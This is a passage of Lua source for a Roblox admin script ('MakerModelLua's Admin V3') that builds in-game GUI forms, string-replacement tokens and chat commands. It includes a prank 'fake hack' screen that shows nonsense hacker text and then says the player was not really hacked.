		local RTextNo = Instance.new("TextLabel", Frame) RTextNo.Name = "RTextNo" RTextNo.Position = UDim2.new(0, 0, 1, -55) RTextNo.Size = UDim2.new(1, 0, 0, 55) RTextNo.BackgroundColor3 = Color3.new(1, 1, 1) RTextNo.BackgroundTransparency = 1 RTextNo.Font = Settings.Font RTextNo.FontSize = "Size18" RTextNo.TextXAlignment = "Right" RTextNo.TextYAlignment = "Bottom" RTextNo.TextColor3 = Color3.new(1, 0, 0) RTextNo.Text = [[No:
]]..No.."/"..Total..[[ 
]]..math.ceil((No/Total)*100).."% "
		local RTextUnknown = Instance.new("TextLabel", Frame) RTextUnknown.Name = "RTextUnknown" RTextUnknown.Position = UDim2.new(0, 0, 1, -55) RTextUnknown.Size = UDim2.new(1, 0, 0, 55) RTextUnknown.BackgroundColor3 = Color3.new(1, 1, 1) RTextUnknown.BackgroundTransparency = 1 RTextUnknown.Font = Settings.Font RTextUnknown.FontSize = "Size18" RTextUnknown.TextYAlignment = "Bottom" RTextUnknown.TextColor3 = Color3.new(0, 0, 0) RTextUnknown.Text = [[No vote:
]]..Unknown.."/"..Total..[[ 
]]..math.ceil((Unknown/Total)*100).."% "
	end
end

--GUI:Vote(game.Players.Player1, {game.Players.Player1}, "fuck me", 30)

function GUI:LoadGui(Player, Text, InfoText)
	if not Player or not Player:FindFirstChild("PlayerGui") then return nil end
	local Dead = false
	
	local Frame, Close = GUI:CreateForm(Player, Text, UDim2.new(0.2,100,0.1,100), nil, 206886319, false)
	local WaitIcon = Instance.new("ImageLabel", Frame) WaitIcon.Name = "WaitIcon" WaitIcon.Position = UDim2.new(0, 10, 0.5, -35) WaitIcon.Size = UDim2.new(0, 70, 0, 70) WaitIcon.BackgroundColor3 = Color3.new(1, 1, 1) WaitIcon.BackgroundTransparency = 1 WaitIcon.Image = "http://roblox.com/asset/?id=206886319"
	local LoadLabel = Instance.new("TextLabel", Frame) LoadLabel.Position = UDim2.new(0, 85, 0, 0) LoadLabel.Size = UDim2.new(1, -90, 1, 0) LoadLabel.TextColor3 = GUI:ContrastColor() LoadLabel.BackgroundTransparency = 1 LoadLabel.Text = Text LoadLabel.Font = "ArialBold" LoadLabel.FontSize = "Size24" LoadLabel.TextWrapped = true LoadLabel.TextXAlignment = "Left"
	local Info = Instance.new("TextLabel", Frame) Info.Size = UDim2.new(1, 0, 1, 0) Info.TextColor3 = GUI:ContrastColor() Info.BackgroundTransparency = 1 Info.Text = "" Info.Font = Settings.Font Info.FontSize = "Size14" Info.TextWrapped = true Info.TextXAlignment = "Left" Info.TextYAlignment = "Bottom"
	if InfoText then Info.Text = InfoText end
	
	local CloseGui = Instance.new("BindableFunction", Frame) CloseGui.Name = "CloseGui"
	local AddInfo = Instance.new("BindableFunction", Frame) CloseGui.Name = "AddInfo"
	
	CloseGui.OnInvoke = function()
		Close:Invoke()
		Dead = true
	end
	AddInfo.OnInvoke = function(AddText)
		Info.Text = AddText
	end
	
	coroutine.wrap(function()
		for i = 0,math.huge,3 do
			if Dead == false and Frame then
				WaitIcon.Rotation = i
				wait()
			else
				break
			end
		end
	end)()
	
	coroutine.wrap(function()
		while Dead == false and Frame do
			wait(0.5)
			LoadLabel.Text = Text.."."
			wait(0.5)
			LoadLabel.Text = Text..".."
			wait(0.5)
			LoadLabel.Text = Text.."..."
			wait(0.5)
			LoadLabel.Text = Text..".."
			wait(0.5)
			LoadLabel.Text = Text.."."
			wait(0.5)
			LoadLabel.Text = Text
		end
	end)()
	
	wait(1)
	
	return CloseGui, AddInfo
end

function GUI:FakeHack(Player) coroutine.wrap(function()
	if not Player or not Player:FindFirstChild("PlayerGui") then return end
	local FakeText = [[
>SHELL: BEGIN
>RUNCODE:
return {
	local Hack = {"Account", "Tix", "Robux"};
	function Start(Type, Inject, Scan) 
		if not Inject then Inject = "In-Game" end
		return {Type, Inject, Scan}
	end
	for Exe,Exploit in pairs(Hack) do
		local IP = Start("In-Game",Exploit,
			BeginScan("PLAYERNAME","Socket",{PLAYERNAME, "Local-ID"};0xPLAYERCONNECT),
			{"LOCAL-IP", "SERVER-IP", "HOST-IP"}
		)
		Start:ExtractData = function() EndScan("RobloxPlayerBeta.exe","Place1","PLAYERNAME") end
		for i = 1,#Injection[2] do
			Log("PlayerData", "ConnectHost", "PLAYERNAME")
		end
		local PlayerProxy = newproxy(true)
		setmetatable(PlayerProxy,Injection[3],{
			__index = function(StealData, ...) local Data = unpack(...)
				return {Data,"IP-KEY-LOG: 'PLAYERNAME'"}
			end;
		})
	end
	Log("HACKED HOST: PLAYERNAME")
}
>HACKED HOST: PLAYERNAME

]]
	local SG = Player.PlayerGui:FindFirstChild("MML Hack Gui")
	if SG then SG:Destroy() end
	SG = Instance.new("ScreenGui", Player.PlayerGui)
	SG.Name = "MML Hack Gui"
	local Frame = Instance.new("Frame", SG) Frame.Name = "HackFrame" Frame.BackgroundColor3 = Color3.new(0,0,0) Frame.Position = UDim2.new(0.45,-125,0.4,-100) Frame.Size = UDim2.new(0.1,250,0.1,200)
	local X = Instance.new("TextButton", Frame) X.Name = "X" X.Style = "RobloxButtonDefault" X.Size = UDim2.new(0,20,0,20) X.Visible = false X.Font = "ArialBold" X.FontSize = "Size18" X.Text = "X" X.TextColor3 = Color3.new(1,0,0) X.ZIndex = 2 CORE:HandleEvent(X, "MouseButton1Click", function() SG:Destroy() end)
	local HT = Instance.new("TextLabel", Frame) HT.Name = "Hack Text" HT.Size = UDim2.new(1,0,1,0) HT.BackgroundTransparency = 1 HT.Font = "ArialBold" HT.FontSize = "Size12" HT.TextColor3 = Color3.new(0,1,0) HT.TextXAlignment = "Left" HT.TextYAlignment = "Bottom" HT.ClipsDescendants = true HT.Font = "Code"
	for i = 1,#FakeText do
		HT.Text = string.sub(string.gsub(FakeText, "PLAYERNAME", Player.Name), 1, i)
		if math.random(1,5) == 1 then
			wait()
		end
	end
	HT.Text = string.gsub(FakeText, "PLAYERNAME", Player.Name)
	wait(3)
	HT.Text = HT.Text..[[>INFO: You did not really get hacked, this command is a 
fake hack command from Maker]]..[[ModelLu]]..[[a's Admin V3]]
	X.Visible = true
end)() end

function GUI:CommandBar(Player)
	if not Player or not Player:FindFirstChild("PlayerGui") then return nil end
	
	local Frame = GUI:CreateForm(Player, "Command Bar", UDim2.new(0.5, 100, 0.1, 50), UDim2.new(0.25, -50, 0.1, 0), "Admin", nil, nil, nil, nil, nil, nil, true)
	local CommandBox = Instance.new("TextBox", Frame) CommandBox.Name = "CommandBox" CommandBox.Position = UDim2.new(0.3, 5, 0, 5) CommandBox.Size = UDim2.new(0.7, -20, 0.4, 0) CommandBox.BackgroundColor3 = GUI:GetColor() CommandBox.BackgroundTransparency = Settings.TransparencyScheme CommandBox.Text = "Enter a command here" CommandBox.Font = Settings.Font CommandBox.FontSize = "Size18" CommandBox.TextXAlignment = "Left" CommandBox.TextColor3 = GUI:ContrastColor() CommandBox.ClearTextOnFocus = false
	local Execute = Instance.new("TextButton", Frame) Execute.Name = "Execute" Execute.Position = UDim2.new(0.3, 5, 0.7, -10) Execute.Size = UDim2.new(0.7, -20, 0.4, -10) Execute.BackgroundColor3 = GUI:GetColor() Execute.BackgroundTransparency = Settings.TransparencyScheme Execute.Text = "Execute" Execute.Font = "ArialBold" Execute.FontSize = "Size18" Execute.TextColor3 = GUI:ContrastColor()
	local Suggest = Instance.new("ScrollingFrame", Frame) Suggest.Name = "Suggest" Suggest.BackgroundTransparency = Settings.TransparencyScheme Suggest.CanvasSize = UDim2.new(0,0,0,0) Suggest.BackgroundColor3 = GUI:ContrastColor() Suggest.Size = UDim2.new(0.3,0,1,0)
	
	local _,Rank = RANK:GetRank(Player)
	local UsableCommands = {}
	for CommandNames,Data in pairs(Commands) do
		if not Data.Hidden then
			if RANK:ConvertRank(Data[4]) <= Rank then
				for _,Command in pairs(CommandNames) do
					table.insert(UsableCommands, {Command, Data[3]})
				end
			end
		end
	end
	
	local RPR = CORE:CreateRemotePropertyReader(CommandBox)
	
	local function ExecuteText()
		local Text = CORE:ReadProperty(RPR, Player, "Text")
		CORE:Chatted(Text, Player, true)
		CommandBox.Text = "Enter a command here"
	end
	
	local function AddSuggestion(Text)
		if Text == nil then Text = Settings.Prefix end
		local Suggestion = Instance.new("TextButton", Suggest) Suggestion.Name = "Suggestion" Suggestion.Size = UDim2.new(1, -13, 0, 25) Suggestion.Position = UDim2.new(0,0,0,(#Suggest:GetChildren()-1)*25) Suggestion.BackgroundColor3 = Color3.new(1, 1, 1) Suggestion.BackgroundTransparency = Settings.TransparencyScheme Suggestion.Text = Text Suggestion.Font = Settings.Font Suggestion.FontSize = "Size14" Suggestion.TextXAlignment = "Left" Suggestion.TextColor3 = Color3.new(0, 0, 0)
		Suggest.CanvasSize = Suggest.CanvasSize + UDim2.new(0,0,0,25)
		CORE:HandleEvent(Suggestion, "MouseButton1Down", function()
			if Text == Settings.Prefix then
				CommandBox.Text = Settings.Prefix
			else
				CommandBox.Text = Settings.Prefix..Text
			end
			CORE:ExecuteResource("Focus", CommandBox)
		end, true)
	end
	
	CORE:HandleEvent(CommandBox, "MouseEnter", function()
		if CommandBox.Text == "Enter a command here" then
			CommandBox.Text = ""
		end
	end)
	
	local EnterPressed = Instance.new("RemoteFunction", CommandBox) EnterPressed.Name = "EnterPressed"
	CORE:ExecuteResource("ChatBoxLocal", CommandBox)
	
	CORE:HandleEvent(Execute, "MouseButton1Down", ExecuteText)
	
	
	CORE:HandleEvent(CommandBox, "Changed", function(Prop) if Prop == "Text" then
		Suggest.CanvasSize = UDim2.new(0,0,0,0)
		Suggest:ClearAllChildren()
		local Text = CORE:ReadProperty(RPR, Player, "Text")
		if Text == "" then
			AddSuggestion(Settings.Prefix)
		end
		
		if string.sub(string.lower(Text),1,#Settings.Prefix) == string.lower(Settings.Prefix) then
			Text = string.sub(Text,#Settings.Prefix+1)
		end
		for _,Data in pairs(UsableCommands) do
			local Command,Args = Data[1],Data[2]
			if string.find(string.lower(Command),string.lower(Text)) then
				local NewSuggestion = Command
				if Args >= 1 then NewSuggestion = NewSuggestion..Settings.Bet end
				AddSuggestion(NewSuggestion)
			end
		end
		
	end end)
end

function GUI:Countdown(Player, AllSeconds) coroutine.wrap(function()
	if not Player or not AllSeconds then return nil end
	AllSeconds = tonumber(AllSeconds)
	local Frame, Close, Closed, _, __, Restore = GUI:CreateForm(Player, "Countdown", UDim2.new(0, 200, 0, 80), UDim2.new(0, 0, 0, 200), 154818730)
	AllSeconds = math.floor(AllSeconds)
	if AllSeconds < 1 then AllSeconds = 1 elseif AllSeconds > 300 then AllSeconds = 300 end
	local Time = Instance.new("TextLabel", Frame) Time.Name = "Time" Time.Size = UDim2.new(1, 0, 1, 0) Time.BackgroundTransparency = 1 Time.Text = "00:00" Time.Font = "ArialBold" Time.FontSize = "Size24" Time.TextYAlignment = "Top" Time.TextColor3 = GUI:ContrastColor()
	local Full = Instance.new("Frame", Frame) Full.Name = "Full" Full.Position = UDim2.new(0.1, 0, 0.7, 0) Full.Size = UDim2.new(0.8, 0, 0, 5) Full.BackgroundColor3 = GUI:ContrastColor() Full.BorderSizePixel = 0
	local Part = Instance.new("Frame", Full) Part.Name = "Part" Part.Size = UDim2.new(0, 0, 1, 0) Part.BackgroundColor3 = GUI:GetColor() Part.BorderColor3 = Color3.new(1, 1, 1) Part.BorderSizePixel = 2
	local Tick = SOUND:MakeSound(Frame, 151715959, 1, 1)
	local Alarm = SOUND:MakeSound(Frame, 131573697, 1, 1)
	
	local CurrentSeconds = AllSeconds
	local Alive = true
	coroutine.wrap(function() for i = 0,AllSeconds do
		if not Alive then break end
		local Seconds = tostring(math.fmod(CurrentSeconds,60))
		local Minutes = tostring(math.floor(CurrentSeconds/60))
		if #Seconds == 1 then Seconds = "0"..Seconds end
		if #Minutes == 1 then Minutes = "0"..Minutes end
		Time.Text = Minutes..":"..Seconds
		wait(1)
		if CurrentSeconds <= 0 then
			Alarm:Play()
			Time.Text = "00:00"
			Part.Size = UDim2.new(1,0,1,0)
			Restore:Invoke()
			wait(4)
			Close:Invoke()
			break
		else
			Tick:Play()
			Part.Size = UDim2.new((AllSeconds - CurrentSeconds)/AllSeconds,0,1,0)
			CurrentSeconds = CurrentSeconds - 1
		end
	end end)()
	
	Closed.Event:connect(function()
		if Alive == true then
			Alive = false
			Tick:Stop()
			Alarm:Stop()
		end
	end)
end)() end

function GUI:DetachChat(Player)
	if not Player or not Player:FindFirstChild("PlayerGui") then return nil end
	if Player:FindFirstChild("DetachChatMML") then
		Player.DetachChatMML:Invoke(true)
		wait()
		Player.DetachChatMML:Destroy()
	end
	
	local Frame, _, Closed = GUI:CreateForm(Player, "Detached Chat", UDim2.new(0.5, 0, 0.5, 32), nil, 57550259)
	local SG = Frame.Parent.Parent.Parent
	
	local DCBF = Instance.new("BindableFunction", Player)
	DCBF.Name = "DetachChatMML"
	DCBF.OnInvoke = function(Remove)
		if Remove then
			SG:Destroy()
		end
	end
	CORE:ExecuteResource("CoreChat", SG)
	
	local IsClosed = false
	Closed.Event:connect(function()
		CORE:ExecuteResource("ResetChat", Player:WaitForChild("Backpack"))
		IsClosed = true
	end)
	
	coroutine.wrap(function()
		Player.CharacterRemoving:wait()
		if not IsClosed then
			IsClosed = true
			wait(1)
			CORE:ExecuteResource("ResetChat", Player:WaitForChild("Backpack"))
		end
	end)()
end

function GUI:SendChat(Player, Data, Speaker) coroutine.wrap(function()
	if not Player then return nil end
	if type(Data) ~= "table" then Data = {Text = tostring(Data)} end
	Data.Text = STRING:DetermineFilter(Data.Text, Speaker or Player, Player)
	
	Player:WaitForChild("SendChat"):InvokeClient(Player, Data)
end)() end

function GUI:SoundInfo(Player, SoundID, TitleText, CreatorText, Time, InputSound)
	if not Player or not Player:FindFirstChild("PlayerGui") then return nil end
	if not SoundID then SoundID = SoundInfo["ID"] end
	if not TitleText then TitleText = SoundInfo["Name"] end
	if not CreatorText then CreatorText = SoundInfo["Creator"] end
	if not InputSound then InputSound = Sound end
	
	local NumSounds = 0
	for _,SG in pairs(Player.PlayerGui:GetChildren()) do
		if SG.Name == "M".."a".."k".."erModelLu".."a's Admin Form Sound" then
			NumSounds = NumSounds + 1
		end
	end
	
	local Size = UDim2.new(0.1, 100, 0.1, 100)
	local Frame, Close, Closed, _, Minimized = GUI:CreateForm(Player, "Playing Sound "..SoundID, Size, UDim2.new(Size.X.Scale * NumSounds, (Size.X.Offset * NumSounds) + (NumSounds * 5), 0.5, -50), "Sound", true, nil, nil, false)
	Frame.Parent.Parent.Parent.Name = Frame.Parent.Parent.Parent.Name.." Sound"
	
	local SoundLoudness = Instance.new("Frame", Frame) SoundLoudness.Name = "SoundLoudness" SoundLoudness.Size = UDim2.new(1, 0, 1, 0) SoundLoudness.BackgroundTransparency = 1 SoundLoudness.Visible = false
	local BurstFrame = Instance.new("Frame", SoundLoudness) BurstFrame.Name = "BurstFrame" BurstFrame.Size = UDim2.new(1, 0, 1, 0) BurstFrame.BackgroundTransparency = 1
	local Spin = Instance.new("Frame", SoundLoudness) Spin.Name = "Spin" Spin.Size = UDim2.new(1, 0, 1, 0) Spin.BackgroundTransparency = 1
	local MainPoint = Instance.new("ImageLabel", SoundLoudness) MainPoint.Name = "MainPoint" MainPoint.Position = UDim2.new(0, 0, 0.25, 0) MainPoint.Size = UDim2.new(0.5, 0, 0.5, 0) MainPoint.BackgroundTransparency = 1 MainPoint.Image = "rbxassetid://301292168" MainPoint.SizeConstraint = "RelativeYY"
	local Bar = Instance.new("Frame", SoundLoudness) Bar.Name = "Bar" Bar.Position = UDim2.new(0, 0, 0, 0) Bar.Size = UDim2.new(0, 10, 0.3, 0) Bar.BackgroundTransparency = 1 Bar.SizeConstraint = "RelativeYY" 
	local Fill = Instance.new("Frame", Bar) Fill.Name = "Fill" Fill.Position = UDim2.new(0, 0, 1, 0) Fill.Size = UDim2.new(1, 0, -0.5, 0) Fill.BackgroundColor3 = Color3.new(1, 1, 1) Fill.BorderSizePixel = 0
	local Burst = Instance.new("ImageLabel", SoundLoudness) Burst.Name = "Burst" Burst.BackgroundTransparency = 1 Burst.Image = "rbxassetid://142700369" Burst.ImageTransparency = 0.5-- Bar.SizeConstraint = "RelativeYY"
	
	local Title = Instance.new("TextLabel", Frame) Title.FontSize = "Size24" Title.TextWrapped = true Title.Size = UDim2.new(1, 0, 0.8, -35) Title.TextColor3 = Color3.new(1,1,1) Title.TextStrokeColor3 = Color3.new(0,0,0) Title.TextStrokeTransparency = 0 Title.Text = TitleText Title.BackgroundTransparency = 1 Title.Font = Settings.Font Title.Name = "Title"
	local Creator = Instance.new("TextLabel", Frame) Creator.FontSize = "Size18" Creator.TextWrapped = true Creator.Size = UDim2.new(1, 0, 0.2, 0) Creator.TextColor3 = Color3.new(1,1,1) Creator.TextStrokeColor3 = Color3.new(0,0,0) Creator.TextStrokeTransparency = 0 Creator.Text = CreatorText Creator.Position = UDim2.new(0, 0, 0.8, -35) Creator.BackgroundTransparency = 1 Creator.Font = Settings.Font Creator.Name = "Creator"
	if Sound then
		CORE:ExecuteResource("GraphicalSound", SoundLoudness, {["Sound"] = Sound})
	end
	if Time then
		local Timer = Instance.new("TextLabel", Frame) Timer.FontSize = "Size14" Timer.TextWrapped = true Timer.Size = UDim2.new(1, 0, 0, 35) Timer.TextColor3 = GUI:ContrastColor() Timer.Position = UDim2.new(0, 0, 1, -35) Timer.BackgroundTransparency = 1 Timer.Font = Settings.Font Timer.Name = "Timer"
		local Stop = Instance.new("ImageButton", Timer) Stop.Image = "rbxassetid://49494354" Stop.Size = UDim2.new(0, 30, 0, 30) Stop.BackgroundTransparency = 1 Stop.Position = UDim2.new(1, -35, 0, 2)
	
		coroutine.wrap(function()
			local Alive = true
			
			local function StopTimer() Alive = false end
			Closed.Event:connect(StopTimer)
			Minimized.Event:connect(StopTimer)
			CORE:HandleEvent(Stop, "MouseButton1Down", StopTimer)
			
			for i = Time,0,-1 do
				for ii = 1,10 do
					if Alive == true then
						Timer.Text = i
						wait(0.1)
					else
						break
					end
				end
			end
			if Alive == true then
				Close:Invoke()
			else
				Timer:Destroy()
				Stop:Destroy()
			end
		end)()
	end
end

---- STRING REPLACEMENT OPERATIONS ----

-- {"_REPLACEMENT", "Replaces input string with ".."string description", RequiresPlayer, function(Player)}

-- Like the commands, this table must be placed here in order for the variables in the functions to successfully initalize.

StringReplacements = {
	{"_SERVERTIME", "total server time in seconds", false, function(Player) return tostring(math.floor(Workspace.DistributedGameTime)) end};
	{"_PLACEID", "the current place's ID", false, function(Player) return tostring(game.PlaceId) end};
	{"_CREATORID", "the game's creator's user ID", false, function(Player) return tostring(game.CreatorId) end};
	{"_CREATOR", "the game's creator's username", false, function(Player) return GameOwner end};
	{"_PLACENAME", "the current place's name", false, function(Player) return PlaceName end};
	{"_REVPLACENAME", "the current place's name in reverse", false, function(Player) return string.reverse(PlaceName) end};
	{"_PLACEDESC", "the current place's description", false, function(Player) return PlaceInfo.Description end};
	{"_RANDOM", "a random number from 1-10000", false, function(Player) return tostring(math.random(1,10000)) end};
	{"_DATE", "the current date (if Http connected)", false, function(Player) return Date or "Cannot get date. Http not connected" end};
	{"_TIME", "the current time", false, function(Player) return CORE:GetTime(true) end};
	
	{{"_SOUNDID", "_SONGID", "_MUSICID"}, "the ID of the sound playing", false, function(Player) return tostring(SoundInfo["ID"]) end};
	{{"_SOUNDCREATOR", "_SONGCREATOR", "_MUSICCREATOR"}, "the name of the creator of the sound playing", false, function(Player) return SoundInfo["Creator"] end};
	{{"_SOUND", "_SONG", "_MUSIC"}, "the name of the sound playing", false, function(Player) return SoundInfo["Name"] end};
	{"_FONT", "the font of the admin", false, function(Player) return Settings.Font end};
	{"_COLOR", "the color scheme of the admin", false, function(Player) return Settings.ColorScheme end};
	{{"_TRANS", "_TRANSPARENCY"}, "the transparency scheme of the admin", false, function(Player) return tostring(Settings.TransparencyScheme * 100).."%%" end};
	
	{"_USERID", "player's UserID", true, function(Player) return tostring(Player.UserId) end};
	{"_NAMELEN", "player's username length", true, function(Player) return tostring(string.len(Player.Name)) end};
	{"_REVNAME", "player's username in reverse", true, function(Player) return string.reverse(Player.Name) end};
	{"_UPNAME", "player's username in uppercase", true, function(Player) return string.upper(Player.Name) end};
	{"_LOWNAME", "player's username in lowercase", true, function(Player) return string.lower(Player.Name) end};
	{"_NAME", "player's username", true, function(Player) return Player.Name end};
	{"_LEETNAME", "player's username in leetspeak", true, function(Player) return STRING:LeetSpeak(Player.Name) end};
	{"_ACCOUNTAGE", "player's account age", true, function(Player) return STRING:FindAge(Player.AccountAge) end};
	{"_AGE", "player's account age", true, function(Player) return STRING:FindAge(Player.AccountAge) end};
	{{"_BENCHMARK", "_BENCH"}, "player's benchmark score (if available)", true, function(Player) if ClientInfo[Player.Name].Benchmark then return tostring(ClientInfo[Player.Name].Benchmark) else return "[NO BENCHMARK]" end end};
	{"_WALKSPEED", "player's WalkSpeed", true, function(Player) if Player.Character and Player.Character:FindFirstChild("Humanoid") then return tostring(Player.Character.Humanoid.WalkSpeed) else return "No humanoid" end end};
	{"_HEALTH", "player's health", true, function(Player) if Player.Character and Player.Character:FindFirstChild("Humanoid") then return tostring(Player.Character.Humanoid.Health) else return "No humanoid" end end};
	{"_MAXHEALTH", "player's MaxHealth", true, function(Player) if Player.Character and Player.Character:FindFirstChild("Humanoid") then return tostring(Player.Character.Humanoid.MaxHealth) else return "No humanoid" end end};
	{"_RANKNUM", "player's rank number", true, function(Player) local PlayerRank,RankNum = RANK:GetRank(Player) return tostring(RankNum) end};
	{"_RANK", "player's rank", true, function(Player) local PlayerRank,RankNum = RANK:GetRank(Player) return PlayerRank end};
	{{"_POS", "_POSITION"}, "player's position", true, function(Player) if CORE:FindBodyPart(Player, "Torso") then local Pos = CORE:FindBodyPart(Player, "Torso").Position return tostring(CORE:Round(Pos.X)..", "..CORE:Round(Pos.Y)..", "..CORE:Round(Pos.Z)) else return "No torso" end end};
}

---- COMMANDS ----

-- Format: [{"CommandName", "CommandName2", "..."}] = {"Command Example of Args", "Command Description", Arguments, "Minimum Rank", FunCommand, ExecuteFunction(Speaker, Rank, {Arguments})

Commands = { -- can't make local
	[{"test", "tst"}] = {"", "Prompts a message saying it works. If there's no message it doesn't work", 0, "Member", false, function(Speaker, Rank, Arguments)
		print("[MML's Admin]: Test message from "..Speaker.Name)
		GUI:SendMessage(Speaker, "Test complete", "MakerModelLua's Admin V"..CORE.Version.Value.." works fine!", "Check")
	end};
	
	[{"kill", "die"}] = {"player", "Breaks the player's joints and kills them", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character then
				Player.Character:BreakJoints()
			end
		end
	end};
	
	[{"ff", "forcefield"}] = {"player", "Gives the player a protective forcefield", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character then
				Instance.new("ForceField", Player.Character)
			end
		end
	end};
	
	[{"noff", "unff", "noforcefield", "unforcefield"}] = {"player", "Removes any forcefields on the player", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character then
				for _,Get in pairs(Player.Character:GetChildren()) do
					if Get:IsA("ForceField") then
						Get:Destroy()
					end
				end
			end
		end
	end};
	
	[{"m", "msg", "message"}] = {"string", "Sends everyone in a server a message of string", 1, "Member", false, function(Speaker, Rank, Arguments)
		for _,Player in pairs(Server.Players:GetPlayers()) do
			GUI:SendMessage(Player, "Message from "..Speaker.Name, Arguments[1], "Message", 10, true, Speaker)
		end
	end};
	
	[{"sm", "smsg", "smessage", "systemm", "systemmsg", "systemmessage"}] = {"string", "Sends everyone in a server a message of string as a system message", 1, "Admin", false, function(Speaker, Rank, Arguments)
		for _,Player in pairs(Server.Players:GetPlayers()) do
			GUI:SendMessage(Player, "MAK".."ERMODELLU".."A'S ADMIN SYSTEM MESSAGE", Arguments[1], 132769569, nil, false, Speaker)
		end
	end};
	
	[{"pm", "personalmessage", "personalmsg", "personalm", "pmessage", "pmsg"}] = {"player string", "Sends the particular player a message of string", 2, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			GUI:SendMessage(Player, "Message from "..Speaker.Name, Arguments[2], "Message", 20, false, Speaker)
		end
	end};
	
	[{"cm", "chatmessage", "chatmsg"}] = {"string", "Sends everyone in a server a chatted message of string", 1, "Admin", false, function(Speaker, Rank, Arguments)
		for _,Player in pairs(Server.Players:GetPlayers()) do
			GUI:SendChat(Player, {Text = "[ MML'S ADMIN ]: "..Speaker.Name..": "..Arguments[1], FontSize = Enum.FontSize.Size24}, Speaker)
		end
	end};
	
	[{"pcm", "pchatmessage", "pchatmsg", "personalcm", "personalchatmessage", "personalchatmsg"}] = {"player string", "Sends player the chatted message of string", 2, "Admin", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			GUI:SendChat(Player, {Text = "[ MML'S ADMIN ]: "..Speaker.Name..": "..Arguments[2], FontSize = Enum.FontSize.Size24}, Speaker)
		end
	end};
	
	[{"age", "getage"}] = {"player", "Shows the age of player", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		local AgeList = {} 
		for _,Player in pairs(Players) do
			table.insert(AgeList, Player.Name..": "..STRING:FindAge(Player.AccountAge))
		end
		GUI:ListGui(Speaker, "Player Ages", AgeList, "Time")
	end};
	
	[{"showage", "sendage"}] = {"player players", "Shows the age of player to players", 2, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		local AgeList = {} 
		for _,Player in pairs(Players) do
			table.insert(AgeList, Player.Name..": "..STRING:FindAge(Player.AccountAge))
		end
		local SecondPlayers = STRING:Scan(Arguments[2], Speaker)
		for _,Player in pairs(SecondPlayers) do
			GUI:ListGui(Player, "Player Ages", AgeList, "Time")
		end
	end};
	
	[{"commands", "cmds", "commandlist", "cmdlist"}] = {"", "Shows a list of all the commands", 0, "Non-Admin", false, function(Speaker, Rank, Arguments)
		local Storage = {{}, {}, {}, {}}
		local StorageText = {}
		local Formatted = {}
		for CommandNames,Data in pairs(Commands) do
			if not Data.Hidden then
				local RankNeeded = RANK:ConvertRank(Data[4])
				local Add = ""
				if Data[4] == "Non-Admin" then Add = "BLACK " end
				if Data[4] == "Admin" then Add = "CYAN " end
				if Data[4] == "Member" then Add = "BLUE " end
				if Data[4] == "Owner" then Add = "BROWN " end
				if RankNeeded > RANK:ConvertRank(Rank) then Add = "RED " end
				local AddBet = Settings.Bet
				if Data[3] <= 0 then AddBet = "" end -- for commands with no args
				local Text = Settings.Prefix..CommandNames[1]..AddBet..Data[1].." [ "..Data[4].." ]"
				table.insert(Storage[RankNeeded + 1], Add..Text)
				StorageText[Text] = CommandNames
			end
		end
		for Num,_ in pairs(Storage) do
			table.sort(Storage[Num])
		end
		for _,Table in pairs(Storage) do
			for _,Command in pairs(Table) do
				table.insert(Formatted, Command)
			end
		end
		local Clicked,Dialog = GUI:ListGui(Speaker, "Command List", Formatted, 98616974, true)
		Clicked.Event:connect(function(Text)
			GUI:ShowCommand(Speaker, StorageText[Text], Dialog)
		end)
	end};
	
	[{"getcommand", "getinfo", "getcmd", "commandinfo", "cmdinfo", "commanddetails", "cmddetails"}] = {"string", "Gets information on the command string", 1, "Non-Admin", false, function(Speaker, Rank, Arguments)
		GUI:ShowCommand(Speaker, string.lower(Arguments[1]))
	end};
	
	[{"color", "cs", "colorscheme", "colortheme", "ct", "cscheme"}] = {"string(color)", "Changes the color scheme to Color", 1, "Owner", false, function(Speaker, Rank, Arguments)
		if GUI:GetColor(Arguments[1]) then
			local ColorScheme = string.upper(Arguments[1])
			if ColorScheme == "RANDOM" then Colors.RANDOM = Color3.new(math.random(0,255)/255,math.random(0,255)/255,math.random(0,255)/255) end
			Settings.ColorScheme = ColorScheme
			GUI:SendMessage(Speaker, "Color Scheme Changed", "Color scheme has been changed to "..string.lower(Arguments[1]).." successfully", "Check")
		else
			GUI:SendMessage(Speaker, "Color Scheme Change Fail", "Color scheme cannot be changed to "..string.lower(Arguments[1]).." because it is not a valid color", "Error")
		end
	end};
	
	[{"colors", "colorlist", "listcolors", "colorschemes", "colorthemes", "cschemes"}] = {"", "Shows all the colors in the color list", 0, "Member", false, function(Speaker, Rank, Arguments)
		local List = {}
		for Color,_ in pairs(Colors) do
			table.insert(List, Color.." "..Color)
		end
		GUI:ListGui(Speaker, "Color Schemes", List, 31320560)
	end};
	
	[{"trans", "transparency", "transscheme", "transparencyscheme", "tscheme"}] = {"number", "Changes the transparency scheme to number", 1, "Owner", false, function(Speaker, Rank, Arguments)
		local Transparency = tonumber(Arguments[1])
		if Transparency then
			if Transparency > 90 then Transparency = 90 end
			if Transparency < 10 then Transparency = 10 end
			Settings.TransparencyScheme = Transparency/100

			GUI:SendMessage(Speaker, "Transparency Scheme Change", "Transparency scheme has been changed to "..Transparency.."% successfully", "Check")
		else
			GUI:SendMessage(Speaker, "Transparency Scheme Change Fail", "Transparency scheme cannot be changed to "..Arguments[1].."% because it is not a number", "Error")
		end
	end};
	
	[{"font", "fontscheme", "fscheme"}] = {"string", "Changes the font of the admin.", 1, "Owner", false, function(Speaker, Rank, Arguments)
		if Fonts[Arguments[1]] then
			Settings.Font = Arguments[1]
			GUI:SendMessage(Speaker, "Font Change", "Font has been changed to "..Arguments[1].." successfully", "Check")
		end
	end};
	
